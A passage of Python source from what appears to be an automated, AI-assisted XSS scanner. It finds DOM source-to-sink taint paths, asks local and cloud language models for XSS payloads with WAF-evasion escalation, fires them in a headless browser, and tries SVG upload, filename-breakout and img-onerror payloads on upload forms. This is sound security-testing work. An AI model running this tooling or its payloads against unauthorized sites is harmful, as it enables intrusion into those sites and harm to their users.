            context_type = str(getattr(reflection, "context_type", "") or "")
            if not context_type or context_type in seen_contexts:
                continue
            seen_contexts.add(context_type)
            context_to_params.setdefault(context_type, []).append(probe_result.param_name)

    attempts: list[CoordinatedPayloadAttempt] = []
    seen: set[tuple[str, tuple[tuple[str, str], ...]]] = set()
    for context_type, params in context_to_params.items():
        unique_params: list[str] = []
        for param in params:
            if param not in unique_params:
                unique_params.append(param)
        if len(unique_params) < 2:
            continue
        for index, first_param in enumerate(unique_params):
            for second_param in unique_params[index + 1:]:
                for ordered_first, ordered_second in ((first_param, second_param), (second_param, first_param)):
                    for attempt in _split_attempts_for_context(context_type, ordered_first, ordered_second):
                        dedup_key = (
                            attempt.context_type,
                            tuple(sorted(attempt.param_payloads.items())),
                        )
                        if dedup_key in seen:
                            continue
                        seen.add(dedup_key)
                        attempts.append(attempt)
    return attempts


def _coordinated_surviving_chars(probe_results: list[Any], context_type: str) -> str:
    merged: set[str] = set()
    for probe_result in probe_results:
        for reflection in getattr(probe_result, "reflections", []):
            if getattr(reflection, "context_type", "") == context_type:
                merged.update(getattr(reflection, "surviving_chars", frozenset()))
    return "".join(sorted(merged))


def _build_dom_context(
    *,
    base_context: Any,
    url: str,
    source_type: str,
    source_name: str,
    sink: str,
    code_location: str = "",
    auth_headers: dict[str, str] | None = None,
) -> Any:
    """Build a ParsedContext focused on one DOM source → sink taint path."""
    from dataclasses import replace as dc_replace
    from ai_xss_generator.types import DomSink, ParsedContext

    if base_context is None:
        base_context = ParsedContext(source=url, source_type="url")

    source_sink = "location.hash" if source_type == "fragment" else "location.search"
    dom_note = (
        "[dom:TAINT] "
        + json.dumps({
            "source_type": source_type,
            "source_name": source_name,
            "sink": sink,
            "code_location": code_location,
        }, sort_keys=True)
    )
    extra_sinks = [
        DomSink(
            sink=sink,
            source=f"dom_runtime_taint:{source_type}:{source_name}",
            location=code_location or f"dom_runtime:{source_type}:{source_name}",
            confidence=0.99,
        ),
        DomSink(
            sink=f"dom_source:{source_sink}",
            source=f"dom_runtime_source:{source_name}",
            location=f"dom_runtime:{source_type}:{source_name}",
            confidence=0.99,
        ),
    ]

    auth_notes = list(getattr(base_context, "auth_notes", []) or [])
    if auth_headers and not auth_notes:
        auth_notes.append("Authenticated DOM scan context")

    return dc_replace(
        base_context,
        dom_sinks=extra_sinks + list(getattr(base_context, "dom_sinks", []) or []),
        notes=[dom_note, *list(getattr(base_context, "notes", []) or [])],
        auth_notes=auth_notes,
    )


def _get_dom_local_payloads(
    *,
    context: Any,
    model: str,
    waf: str | None,
    session_lessons: list[Any] | None = None,
    local_timeout_seconds: int = _ACTIVE_LOCAL_MODEL_TIMEOUT_SECONDS,
) -> list[Any]:
    """Ask the local model for DOM XSS payloads for one tainted source → sink path."""
    try:
        from ai_xss_generator.models import generate_dom_local_payloads
        from ai_xss_generator.learning import build_memory_profile

        sink = _dom_sink_from_context(context)
        memory_profile = build_memory_profile(
            context=context,
            waf_name=waf,
            delivery_mode="dom",
        )
        payloads, engine = generate_dom_local_payloads(
            context=context,
            model=model,
            waf=waf,
            reference_payloads=_dom_reference_payloads_for_sink(sink),
            memory_profile=memory_profile,
            past_lessons=session_lessons,
            local_timeout_seconds=local_timeout_seconds,
        )
        return [
            p
            for p in payloads
            if getattr(p, "payload", "") and getattr(p, "source", "heuristic") != "heuristic"
        ]
    except Exception as exc:
        log.debug("DOM local model failed for %s: %s", getattr(context, "source", "?"), exc)
        return []


def _get_dom_cloud_payloads(
    *,
    context: Any,
    cloud_model: str,
    waf: str | None,
    ekey: str,
    dedup_registry: DictProxy,
    dedup_lock: Any,
    ai_backend: str = "api",
    cli_tool: str = "claude",
    cli_model: str | None = None,
    session_lessons: list[Any] | None = None,
    feedback_lessons: list[Any] | None = None,
    phase_profile: str = "normal",
    deep: bool = False,
    phases: tuple[str, ...] | None = None,
    strategy_hint: str | None = None,
) -> CloudPayloadPlan:
    """Call the cloud model once per unique DOM source → sink fingerprint."""
    use_dedup = not feedback_lessons
    if use_dedup:
        with dedup_lock:
            if ekey in dedup_registry:
                log.debug("DOM dedup hit — reusing cloud result for key %s", ekey[:12])
                cached = dict(dedup_registry[ekey])
                return CloudPayloadPlan(
                    payloads=list(cached.get("payloads", [])),
                    engine=str(cached.get("engine", "")),
                    note=str(cached.get("note", "")),
                )

    try:
        from ai_xss_generator.models import generate_cloud_payloads
        from ai_xss_generator.learning import build_memory_profile

        sink = _dom_sink_from_context(context)
        memory_profile = build_memory_profile(
            context=context,
            waf_name=waf,
            delivery_mode="dom",
        )
        payloads, engine = generate_cloud_payloads(
            context=context,
            cloud_model=cloud_model,
            waf=waf,
            reference_payloads=_dom_reference_payloads_for_sink(sink),
            past_lessons=_join_lessons(session_lessons, feedback_lessons),
            ai_backend=ai_backend,
            cli_tool=cli_tool,
            cli_model=cli_model,
            memory_profile=memory_profile,
            phase_profile=phase_profile,
            deep=deep,
            phases=phases,
            strategy_hint=strategy_hint,
        )
        result_plan = CloudPayloadPlan(
            payloads=[p for p in payloads if getattr(p, "payload", "")],
            engine=engine,
            note=_cloud_note_for_engine(
                ai_backend=ai_backend,
                requested_cli_tool=cli_tool,
                engine=engine,
            ),
        )
    except Exception as exc:
        log.debug("DOM cloud model failed for %s: %s", getattr(context, "source", "?"), exc)
        result_plan = CloudPayloadPlan()

    if use_dedup:
        with dedup_lock:
            dedup_registry[ekey] = {
                "payloads": [
                    payload.to_dict() if hasattr(payload, "to_dict") else payload
                    for payload in result_plan.payloads
                ],
                "engine": result_plan.engine,
                "note": result_plan.note,
            }
    return result_plan


# ---------------------------------------------------------------------------
# DOM XSS worker entry point
# ---------------------------------------------------------------------------

def run_dom_worker(
    url: str,
    waf_hint: str | None,
    model: str,
    cloud_model: str,
    use_cloud: bool,
    timeout_seconds: int,
    result_queue: "multiprocessing.Queue",
    dedup_registry: "DictProxy",
    dedup_lock: Any,
    auth_headers: dict[str, str] | None = None,
    ai_backend: str = "api",
    cli_tool: str = "claude",
    cli_model: str | None = None,
    cloud_attempts: int = 1,
    deep: bool = False,
    fast: bool = False,
    waf_source: str | None = None,
    keep_searching: bool = False,
    extreme: bool = False,
    research: bool = False,
) -> None:
    """Worker entry point for DOM XSS runtime scanning.

    Runs as an isolated multiprocessing.Process.  Launches its own Playwright
    browser, calls scan_dom_xss(), converts results to ConfirmedFinding objects,
    and puts a WorkerResult onto result_queue.
    """
    start_time = time.monotonic()

    def _put_result(result: WorkerResult) -> None:
        result.duration_seconds = time.monotonic() - start_time
        result_queue.put(result)

    try:
        _run_dom(
            url=url,
            waf_hint=waf_hint,
            model=model,
            cloud_model=cloud_model,
            use_cloud=use_cloud,
            timeout_seconds=timeout_seconds,
            put_result=_put_result,
            dedup_registry=dedup_registry,
            dedup_lock=dedup_lock,
            auth_headers=auth_headers,
            ai_backend=ai_backend,
            cli_tool=cli_tool,
            cli_model=cli_model,
            cloud_attempts=cloud_attempts,
            deep=deep,
            fast=fast,
            waf_source=waf_source,
            keep_searching=keep_searching,
            extreme=extreme,
            research=research,
        )
    except Exception as exc:
        log.exception("DOM worker crashed for %s", url)
        _put_result(WorkerResult(url=url, status="error", error=str(exc), kind="dom"))


def _run_dom(
    *,
    url: str,
    waf_hint: str | None,
    model: str,
    cloud_model: str,
    use_cloud: bool,
    timeout_seconds: int,
    put_result: Any,
    dedup_registry: "DictProxy",
    dedup_lock: Any,
    auth_headers: dict[str, str] | None = None,
    ai_backend: str = "api",
    cli_tool: str = "claude",
    cli_model: str | None = None,
    cloud_attempts: int = 1,
    deep: bool = False,
    fast: bool = False,
    waf_source: str | None = None,
    keep_searching: bool = False,
    extreme: bool = False,
    research: bool = False,
) -> None:
    from playwright.sync_api import sync_playwright
    from ai_xss_generator.active.dom_xss import (
        attempt_dom_payloads,
        discover_dom_taint_paths,
        fallback_payloads_for_sink,
    )
    from ai_xss_generator.parser import parse_target as _parse_target

    started_at = time.monotonic()
    deadline = started_at + active_worker_timeout_budget(
        timeout_seconds,
        use_cloud,
        ai_backend,
        cloud_attempts=cloud_attempts,
    )

    def _timed_out() -> bool:
        return time.monotonic() > deadline

    # Cap per-navigation timeout to 15 s regardless of the overall worker timeout
    nav_timeout_ms = min(timeout_seconds * 1_000, 15_000)
    local_model_timeout_seconds = (
        _RESEARCH_LOCAL_MODEL_TIMEOUT_SECONDS if research else _ACTIVE_LOCAL_MODEL_TIMEOUT_SECONDS
    )
    context_hit_cap = _keep_searching_hit_cap(keep_searching, extreme, research)
    phase_profile = _phase_profile_name(extreme, research)
    _cached_context: Any = None
    try:
        _cached_context = _parse_target(
            url=url,
            html_value=None,
            waf=waf_hint,
            auth_headers=auth_headers,
        )
        if waf_source:
            from ai_xss_generator.waf_knowledge import analyze_waf_source, attach_waf_knowledge
            _cached_context = attach_waf_knowledge(_cached_context, analyze_waf_source(waf_source))
    except Exception as exc:
        log.debug("Pre-parse of DOM target %s failed: %s", url, exc)

    try:
        pw = sync_playwright().start()
        browser = pw.chromium.launch(
            headless=True,
            args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"],
        )
        try:
            dom_hits = discover_dom_taint_paths(url, browser, auth_headers, timeout_ms=nav_timeout_ms)
            dom_hits = sorted(dom_hits, key=_dom_hit_priority)
        finally:
            browser.close()
            pw.stop()
    except Exception as exc:
        put_result(WorkerResult(
            url=url, status="error", error=f"DOM XSS scan failed: {exc}", kind="dom",
        ))
        return

    findings: list[ConfirmedFinding] = []
    cloud_escalated = False
    local_model_rounds = 0
    cloud_model_rounds = 0
    fallback_rounds = 0
    escalation_reasons: list[str] = []
    dom_session_lessons: list[Any] = []
    target_disposition: Any = None
    try:
        from ai_xss_generator.behavior import (
            attach_behavior_profile,
            build_target_behavior_profile,
            classify_target_disposition,
        )
        from ai_xss_generator.learning import build_memory_profile
        from ai_xss_generator.lessons import build_behavior_lessons, build_mapping_lessons

        behavior_profile = build_target_behavior_profile(
            url=url,
            delivery_mode="dom",
            waf_name=waf_hint,
            auth_required=bool(auth_headers),
            context=_cached_context,
            dom_hits=dom_hits,
        )
        _cached_context = attach_behavior_profile(_cached_context, behavior_profile)
        target_disposition = classify_target_disposition(
            _cached_context,
            delivery_mode="dom",
            dom_hits=len(dom_hits),
        )

        memory_profile = build_memory_profile(
            context=_cached_context,
            waf_name=waf_hint,
            delivery_mode="dom",
        )
        if auth_headers:
            memory_profile["auth_required"] = True
        dom_session_lessons.extend(build_behavior_lessons(behavior_profile))
        if _cached_context is not None:
            dom_session_lessons.extend(build_mapping_lessons(
                _cached_context,
                memory_profile=memory_profile,
            ))
    except Exception as exc:
        log.debug("DOM lesson build failed for %s: %s", url, exc)

    try:
        pw = sync_playwright().start()
        browser = pw.chromium.launch(
            headless=True,
            args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"],
        )
        try:
            for hit in dom_hits:
                if _timed_out():
                    break
                dom_context = _build_dom_context(
                    base_context=_cached_context,
                    url=url,
                    source_type=hit.source_type,
                    source_name=hit.source_name,
                    sink=hit.sink,
                    code_location=hit.code_location,
                    auth_headers=auth_headers,
                )
                from ai_xss_generator.behavior import derive_ai_escalation_policy

                escalation_policy = derive_ai_escalation_policy(
                    dom_context,
                    delivery_mode="dom",
                    sink_context=hit.sink,
                )
                _append_reason(escalation_reasons, escalation_policy.note)
                confirmed = False
                fired_payload = ""
                fired_url = hit.canary_url
                detail = (
                    f"DOM taint confirmed — canary reached sink '{hit.sink}' via "
                    f"{hit.source_type}:{hit.source_name!r}. "
                    f"Real payload did not execute (possible CSP or payload mismatch)."
                )
                source = "dom_xss_runtime"
                transform_name = "dom_xss_runtime"
                cloud_used_for_hit = False
                ai_engine = ""
                ai_note = ""
                local_stage = None
                # fast mode: bypass local model entirely — cloud fires immediately
                local_done = (not escalation_policy.use_local) or fast
                local_payloads: list[str] = []
                local_payloads_tried = False
                cloud_stage = None
                cloud_rounds_started = 0
                cloud_rounds_exhausted = False
                cloud_plan = CloudPayloadPlan()
                cloud_payloads: list[str] = []
                cloud_feedback_lessons: list[Any] | None = None
                seen_cloud_payloads: set[str] = set()
                fast_generated_count = 0
                cloud_delay_deadline = time.monotonic() + (
                    escalation_policy.cloud_start_after_seconds
                    if escalation_policy.cloud_start_after_seconds is not None
                    else _DOM_CLOUD_START_AFTER_SECONDS
                )
                cloud_ekey = _escalation_key(
                    url=url,
                    param_name=hit.source_name,
                    waf=waf_hint,
                    surviving_chars=frozenset(),
                    context_type=f"dom:{hit.source_type}:{hit.sink}",
                )

                if escalation_policy.use_local and not _timed_out():
                    local_model_rounds += 1
                    local_stage = _start_async_payload_stage(lambda: _get_dom_local_payloads(
                        context=dom_context,
                        model=model,
                        waf=waf_hint,
                        session_lessons=dom_session_lessons,
                        local_timeout_seconds=min(
                            local_model_timeout_seconds,
                            escalation_policy.local_timeout_seconds,
                        ),
                    ))

                def _try_dom_payloads(payloads: list[str], stage_name: str) -> bool:
                    nonlocal confirmed, fired_payload, fired_url, detail
                    nonlocal source, transform_name, local_payloads_tried, cloud_used_for_hit, cloud_escalated
                    nonlocal ai_engine, ai_note
                    if not payloads or _timed_out():
                        return False
                    exec_ok, exec_payload, exec_detail = attempt_dom_payloads(
                        browser=browser,
                        url=url,
                        source_type=hit.source_type,
                        source_name=hit.source_name,
                        sink=hit.sink,
                        payloads=payloads,
                        auth_headers=auth_headers or {},
                        timeout_ms=nav_timeout_ms,
                    )
                    if stage_name == "local_model":
                        local_payloads_tried = True
                    if stage_name == "cloud_model":
                        cloud_used_for_hit = True
                        cloud_escalated = True
                        ai_engine = cloud_plan.engine
                        ai_note = _merge_ai_notes(
                            escalation_policy.note,
                            _cloud_attempt_note(
                                cloud_plan.note,
                                cloud_rounds_started,
                                max(1, cloud_attempts),
                            ),
                        )
                    if exec_ok:
                        confirmed = True
                        fired_payload = exec_payload
                        fired_url = _inject_dom_source(url, hit.source_type, hit.source_name, exec_payload)
                        detail = exec_detail
                        source = stage_name
                        transform_name = stage_name
                        return True
                    return False

                while not confirmed and not _timed_out():
                    if local_stage is not None and not local_done:
                        local_ready, payloads = _poll_async_payloads(local_stage[1])
                        if local_ready:
                            local_done = True
                            local_payloads = payloads
                            if _try_dom_payloads(local_payloads, "local_model"):
                                break

                    if use_cloud and cloud_stage is None and not cloud_rounds_exhausted:
                        should_start_cloud = (
                            local_done
                        ) or (not local_done and time.monotonic() >= cloud_delay_deadline)
                        if should_start_cloud:
                            cloud_rounds_started += 1
                            cloud_model_rounds += 1
                            cloud_escalated = True
                            cloud_stage = _start_async_payload_stage(lambda: _get_dom_cloud_payloads(
                                context=dom_context,
                                cloud_model=cloud_model,
                                waf=waf_hint,
                                ekey=cloud_ekey,
                                dedup_registry=dedup_registry,
                                dedup_lock=dedup_lock,
                                ai_backend=ai_backend,
                                cli_tool=cli_tool,
                                cli_model=cli_model,
                                session_lessons=dom_session_lessons,
                                feedback_lessons=cloud_feedback_lessons,
                                phase_profile=phase_profile,
                                deep=deep,
                            ))

                    if cloud_stage is not None:
                        cloud_ready, plan = _poll_async_payloads(cloud_stage[1])
                        if cloud_ready:
                            cloud_stage = None
                            cloud_plan = _coerce_cloud_plan(plan)
                            cloud_payloads, duplicate_payloads = _unique_new_payloads(
                                cloud_plan.payloads,
                                seen_cloud_payloads,
                            )
                            fast_generated_count += len(cloud_payloads)
                            if _try_dom_payloads(cloud_payloads, "cloud_model"):
                                break
                            cloud_feedback_lessons = _build_cloud_feedback_lessons(
                                attempt_number=cloud_rounds_started,
                                total_attempts=max(1, cloud_attempts),
                                prompt_context=dom_context,
                                delivery_mode="dom",
                                context_type="dom_xss",
                                sink_context=hit.sink,
                                payloads_tried=cloud_payloads,
                                execution_results=[],
                                duplicate_payloads=duplicate_payloads,
                                observation="DOM sink stayed taint-only; no execution signal fired.",
                            )
                            if cloud_rounds_started >= max(1, cloud_attempts):
                                cloud_rounds_exhausted = True
                            else:
                                cloud_delay_deadline = time.monotonic()

                    if local_done and (not use_cloud or cloud_rounds_exhausted) and cloud_stage is None:
                        break
                    if local_done and local_payloads_tried and (not use_cloud or (cloud_rounds_exhausted and cloud_stage is None)):
                        break
                    if local_done and not local_payloads and not use_cloud:
                        break
                    time.sleep(0.05)

                if not confirmed and not deep and use_cloud and not _timed_out() and fast_generated_count > 0:
                    _dom_strategy_hint = _analyze_fast_failure_strategy(
                        context=dom_context,
                        cloud_model=cloud_model,
                        waf_hint=waf_hint,
                        generated_count=fast_generated_count,
                        reflected_count=fast_generated_count,
                        ai_backend=ai_backend,
                        cli_tool=cli_tool,
                        cli_model=cli_model,
                        phase_profile=phase_profile,
                    )
                    cloud_model_rounds += 1
                    cloud_escalated = True
                    # DOM escalation uses _get_dom_cloud_payloads (different from GET/POST paths)
                    cloud_plan = _coerce_cloud_plan(_get_dom_cloud_payloads(
                        context=dom_context,
                        cloud_model=cloud_model,
                        waf=waf_hint,
                        ekey=cloud_ekey,
                        dedup_registry=dedup_registry,
                        dedup_lock=dedup_lock,
                        ai_backend=ai_backend,
                        cli_tool=cli_tool,
                        cli_model=cli_model,
                        session_lessons=dom_session_lessons,
                        feedback_lessons=cloud_feedback_lessons,
                        phase_profile=phase_profile,
                        phases=("contextual", "research"),
                        strategy_hint=_dom_strategy_hint,
                    ))
                    cloud_payloads, _ = _unique_new_payloads(
                        cloud_plan.payloads,
                        seen_cloud_payloads,
                    )
                    if _try_dom_payloads(cloud_payloads, "cloud_model"):
                        ai_note = _merge_ai_notes(
                            escalation_policy.note,
                            "Deep escalation after scout attempts exhausted.",
                            cloud_plan.note,
                        )

                if not confirmed and not _timed_out():
                    fallback_rounds += 1
                    fallback_payloads = fallback_payloads_for_sink(hit.sink)
                    exec_ok, exec_payload, exec_detail = attempt_dom_payloads(
                        browser=browser,
                        url=url,
                        source_type=hit.source_type,
                        source_name=hit.source_name,
                        sink=hit.sink,
                        payloads=fallback_payloads,
                        auth_headers=auth_headers or {},
                        timeout_ms=nav_timeout_ms,
                    )
                    if exec_ok:
                        confirmed = True
                        fired_payload = exec_payload
                        fired_url = _inject_dom_source(url, hit.source_type, hit.source_name, exec_payload)
                        detail = exec_detail
                        source = "phase1_transform"
                        transform_name = "dom_static_fallback"
                        ai_note = _merge_ai_notes(
                            escalation_policy.note,
                            (
                                _cloud_attempt_note(
                                    cloud_plan.note,
                                    cloud_rounds_started,
                                    max(1, cloud_attempts),
                                )
                                if cloud_rounds_started
                                else cloud_plan.note
                            ),
                        )

                findings.append(
                    ConfirmedFinding(
                        url=url,
                        param_name=hit.source_name,
                        context_type="dom_xss",
                        sink_context=hit.sink,
                        payload=fired_payload,
                        transform_name=transform_name,
                        execution_method="dom_xss" if confirmed else "dom_taint",
                        execution_detail=detail,
                        waf=waf_hint,
                        surviving_chars="",
                        fired_url=fired_url,
                        source=source,
                        cloud_escalated=cloud_used_for_hit,
                        code_location=hit.code_location,
                        ai_engine=ai_engine,
                        ai_note=ai_note or escalation_policy.note,
                    )
                )
        finally:
            browser.close()
            pw.stop()
    except Exception as exc:
        put_result(WorkerResult(
            url=url, status="error", error=f"DOM XSS payload execution failed: {exc}", kind="dom",
        ))
        return

    if any(f.execution_method == "dom_xss" for f in findings):
        status = "confirmed"
    elif findings:
        status = "taint_only"
    else:
        status = "no_execution"
    put_result(WorkerResult(
        url=url,
        status=status,
        confirmed_findings=findings,
        waf=waf_hint,
        cloud_escalated=cloud_escalated,
        kind="dom",
        dead_target=bool(getattr(target_disposition, "is_dead", False)),
        dead_reason=(
            getattr(target_disposition, "reason", "")
            if findings or status == "taint_only"
            else (
                getattr(target_disposition, "reason", "")
                or "No DOM source-to-sink taint path was confirmed."
            )
        ),
        target_tier=getattr(target_disposition, "tier", "live"),
        local_model_rounds=local_model_rounds,
        cloud_model_rounds=cloud_model_rounds,
        fallback_rounds=fallback_rounds,
        escalation_reasons=escalation_reasons,
    ))


def _upload_attempts(upload_target: "UploadTarget") -> list[dict[str, Any]]:
    first_companion = upload_target.companion_field_names[0] if upload_target.companion_field_names else ""
    benign_defaults = {name: "axss" for name in upload_target.companion_field_names}
    svg_payload = '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"></svg>'
    attempts: list[dict[str, Any]] = [
        {
            "transform_name": "upload_svg_inline",
            "file_name": "axss-avatar.svg",
            "file_content": svg_payload,
            "companion_overrides": dict(benign_defaults),
            "payload_summary": "inline SVG upload with onload handler",
        },
        {
            "transform_name": "upload_filename_reflection",
            "file_name": "avatar\"><svg/onload=alert(1)>.svg",
            "file_content": '<svg xmlns="http://www.w3.org/2000/svg"><text>axss</text></svg>',
            "companion_overrides": dict(benign_defaults),
            "payload_summary": "filename breakout via SVG upload",
        },
    ]
    if first_companion:
        companion_overrides = dict(benign_defaults)
        companion_overrides[first_companion] = '<img src=x onerror=alert(1)>'
        attempts.append({
            "transform_name": "upload_companion_field",
            "file_name": "axss-profile.svg",
            "file_content": '<svg xmlns="http://www.w3.org/2000/svg"><text>axss</text></svg>',
            "companion_overrides": companion_overrides,
            "payload_summary": f"companion field {first_companion}=<img src=x onerror=alert(1)>",
        })
    return attempts


def _make_upload_finding(
    *,
    upload_target: "UploadTarget",
    result: Any,
    waf: str | None,
    payload_summary: str,
) -> ConfirmedFinding:
    return ConfirmedFinding(
        url=upload_target.action_url,
        param_name="+".join(upload_target.file_field_names),
        context_type="stored_upload",
        sink_context="upload_render",
        payload=payload_summary,
        transform_name=result.transform_name,
        execution_method=result.method,
        execution_detail=result.detail,
        waf=waf,
        surviving_chars="",
        fired_url=result.fired_url,
        source="phase1_transform",
        cloud_escalated=False,
    )


def run_upload_worker(
    upload_target: "UploadTarget",
    waf_hint: str | None,
    timeout_seconds: int,
    result_queue: "multiprocessing.Queue",
    auth_headers: dict[str, str] | None = None,
    sink_url: str | None = None,
) -> None:
    """Worker entry point for multipart upload targets."""
    start_time = time.monotonic()

    def _put_result(result: WorkerResult) -> None:
        result.duration_seconds = time.monotonic() - start_time
        result_queue.put(result)

    try:
        _run_upload(
            upload_target=upload_target,
            waf_hint=waf_hint,
            timeout_seconds=timeout_seconds,
            put_result=_put_result,
            auth_headers=auth_headers,
            sink_url=sink_url,
        )
    except Exception as exc:
        log.exception("Upload worker crashed for %s", upload_target.action_url)
        _put_result(WorkerResult(
            url=upload_target.action_url,
            status="error",
            error=str(exc),
            kind="upload",
        ))


def _run_upload(
    *,
    upload_target: "UploadTarget",
    waf_hint: str | None,
    timeout_seconds: int,
    put_result: Any,
    auth_headers: dict[str, str] | None = None,
    sink_url: str | None = None,
) -> None:
    from ai_xss_generator.active.executor import ActiveExecutor

    if not upload_target.file_field_names:
        put_result(WorkerResult(
            url=upload_target.action_url,
            status="no_params",
            waf=waf_hint,
            kind="upload",
            dead_target=True,
            dead_reason="No file input fields were available for upload testing.",
            target_tier="hard_dead",
        ))
        return

    deadline = time.monotonic() + max(timeout_seconds, 60)

    def _timed_out() -> bool:
        return time.monotonic() > deadline

    executor = ActiveExecutor(auth_headers=auth_headers)
    try:
        executor.start()
    except Exception as exc:
        put_result(WorkerResult(
            url=upload_target.action_url,
            status="error",
            error=f"Playwright start failed: {exc}",
            waf=waf_hint,
            kind="upload",
            target_tier="high_value",
        ))
        return

    confirmed_findings: list[ConfirmedFinding] = []
    total_transforms_tried = 0
    fallback_rounds = 0
    escalation_reasons = [
        "Artifact workflow discovered — using bounded deterministic upload attempts first.",
    ]
    try:
        for attempt in _upload_attempts(upload_target):
            if _timed_out():
                break
            total_transforms_tried += 1
            fallback_rounds += 1
            result = executor.fire_upload(
                source_page_url=upload_target.source_page_url,
                action_url=upload_target.action_url,
                file_field_names=upload_target.file_field_names,
                companion_overrides=attempt["companion_overrides"],
                file_name=attempt["file_name"],
                file_content=attempt["file_content"],
                transform_name=attempt["transform_name"],
                sink_url=sink_url,
            )
            if result.confirmed:
                confirmed_findings.append(_make_upload_finding(
                    upload_target=upload_target,
                    result=result,
                    waf=waf_hint,
                    payload_summary=attempt["payload_summary"],
                ))
                break
    finally:
        executor.stop()

    put_result(WorkerResult(
        url=upload_target.action_url,
        status="confirmed" if confirmed_findings else "no_execution",
        confirmed_findings=confirmed_findings,
        transforms_tried=total_transforms_tried,
        waf=waf_hint,
        params_tested=len(upload_target.file_field_names) + len(upload_target.companion_field_names),
        params_reflected=0,
        kind="upload",
        target_tier="high_value",
        fallback_rounds=fallback_rounds,
        escalation_reasons=escalation_reasons,
    ))


def _get_cloud_payloads(
    url: str,
    probe_result: Any,
    cloud_model: str,
    waf: str | None,
    ekey: str,
    dedup_registry: DictProxy,
    dedup_lock: Any,
    base_context: Any = None,
    auth_headers: dict[str, str] | None = None,
    ai_backend: str = "api",
    cli_tool: str = "claude",
    cli_model: str | None = None,
    delivery_mode: str = "get",
    session_lessons: list[Any] | None = None,
    feedback_lessons: list[Any] | None = None,
    phase_profile: str = "normal",
    deep: bool = False,
    phases: tuple[str, ...] | None = None,
    strategy_hint: str | None = None,
) -> CloudPayloadPlan:
    """Check dedup registry; call cloud model if this is a novel fingerprint.

    *base_context* is a pre-parsed ParsedContext for *url*. When provided it
    avoids a redundant HTTP fetch.
    """
    use_dedup = not feedback_lessons
    if use_dedup:
        with dedup_lock:
            if ekey in dedup_registry:
                log.debug("Dedup hit — reusing cloud result for key %s", ekey[:12])
                cached = dict(dedup_registry[ekey])
                return _coerce_cloud_plan(cached)

    try:
        from ai_xss_generator.probe import enrich_context
        from ai_xss_generator.models import generate_cloud_payloads
        from ai_xss_generator.learning import build_memory_profile

        if base_context is None:
            from ai_xss_generator.parser import parse_target
            base_context = parse_target(url=url, html_value=None, waf=waf, auth_headers=auth_headers)

        context = enrich_context(base_context, [probe_result])
        reference_payloads = _waf_reference_payloads(waf, probe_result)
        memory_profile = build_memory_profile(
            context=context,
            waf_name=waf,
            delivery_mode=delivery_mode,
        )
        payloads, engine = generate_cloud_payloads(
            context=context,
            cloud_model=cloud_model,
            waf=waf,
            reference_payloads=reference_payloads,
            past_lessons=_join_lessons(session_lessons, feedback_lessons),
            ai_backend=ai_backend,
            cli_tool=cli_tool,
            cli_model=cli_model,
            memory_profile=memory_profile,
            phase_profile=phase_profile,
            deep=deep,
            phases=phases,
            strategy_hint=strategy_hint,
        )
        result_plan = CloudPayloadPlan(
            payloads=[p.payload for p in payloads if p.payload],
            engine=engine,
            note=_cloud_note_for_engine(
                ai_backend=ai_backend,
                requested_cli_tool=cli_tool,
                engine=engine,
            ),
        )
    except Exception as exc:
        log.debug("Cloud escalation failed for %s: %s", url, exc)
        result_plan = CloudPayloadPlan()

    if use_dedup:
        with dedup_lock:
            dedup_registry[ekey] = {
                "payloads": list(result_plan.payloads),
                "engine": result_plan.engine,
                "note": result_plan.note,
            }

    return result_plan


# ---------------------------------------------------------------------------
# POST form worker entry point
# ---------------------------------------------------------------------------

def run_post_worker(
    post_form: "PostFormTarget",
    rate: float,
    waf_hint: str | None,
    model: str,
    cloud_model: str,
    use_cloud: bool,
    timeout_seconds: int,
    result_queue: "multiprocessing.Queue",
    dedup_registry: "DictProxy",
    dedup_lock: Any,
    findings_lock: Any,
    auth_headers: dict[str, str] | None = None,
    crawled_pages: list[str] | None = None,
    sink_url: str | None = None,
    ai_backend: str = "api",
    cli_tool: str = "claude",
    cli_model: str | None = None,
    cloud_attempts: int = 1,
    deep: bool = False,
    fast: bool = False,
    waf_source: str | None = None,
    keep_searching: bool = False,
    extreme: bool = False,
    research: bool = False,
) -> None:
    """Worker entry point for POST form targets. Mirrors run_worker() for GET URLs."""
    start_time = time.monotonic()

    def _put_result(result: WorkerResult) -> None:
        result.duration_seconds = time.monotonic() - start_time
        result_queue.put(result)

    try:
        _run_post(
            post_form=post_form,
            rate=rate,
            waf_hint=waf_hint,
            model=model,
            cloud_model=cloud_model,
            use_cloud=use_cloud,
            timeout_seconds=timeout_seconds,
            dedup_registry=dedup_registry,
            dedup_lock=dedup_lock,
            findings_lock=findings_lock,
            start_time=start_time,
            put_result=_put_result,
            auth_headers=auth_headers,
            crawled_pages=crawled_pages,
            sink_url=sink_url,
            ai_backend=ai_backend,
            cli_tool=cli_tool,
            cli_model=cli_model,
            cloud_attempts=cloud_attempts,
            deep=deep,
            fast=fast,
            waf_source=waf_source,
            keep_searching=keep_searching,
            extreme=extreme,
            research=research,
        )
    except Exception as exc:
        log.exception("POST worker crashed for %s", post_form.action_url)
        _put_result(WorkerResult(
            url=post_form.action_url, status="error", error=str(exc)
        ))


def _run_post(
    *,
    post_form: "PostFormTarget",
    rate: float,
    waf_hint: str | None,
    model: str,
    cloud_model: str,
    use_cloud: bool,
    timeout_seconds: int,
    dedup_registry: "DictProxy",
    dedup_lock: Any,
    findings_lock: Any,
    start_time: float,
    put_result: Any,
    auth_headers: dict[str, str] | None = None,
    crawled_pages: list[str] | None = None,
    sink_url: str | None = None,
    ai_backend: str = "api",
    cli_tool: str = "claude",
    cli_model: str | None = None,
    cloud_attempts: int = 1,
    deep: bool = False,
    fast: bool = False,
    waf_source: str | None = None,
    keep_searching: bool = False,
    extreme: bool = False,
    research: bool = False,
) -> None:
    from ai_xss_generator.probe import probe_post_form
    from ai_xss_generator.active.executor import ActiveExecutor
    from ai_xss_generator.active.transforms import all_variants_for_probe
    from ai_xss_generator.parser import parse_target as _parse_target

    deadline = start_time + active_worker_timeout_budget(
        timeout_seconds,
        use_cloud,
        ai_backend,
        cloud_attempts=cloud_attempts,
    )
    local_model_timeout_seconds = (
        _RESEARCH_LOCAL_MODEL_TIMEOUT_SECONDS if research else _ACTIVE_LOCAL_MODEL_TIMEOUT_SECONDS
    )
    context_hit_cap = _keep_searching_hit_cap(keep_searching, extreme, research)
    phase_profile = _phase_profile_name(extreme, research)

    def _timed_out() -> bool:
        return time.monotonic() > deadline

    if not post_form.param_names:
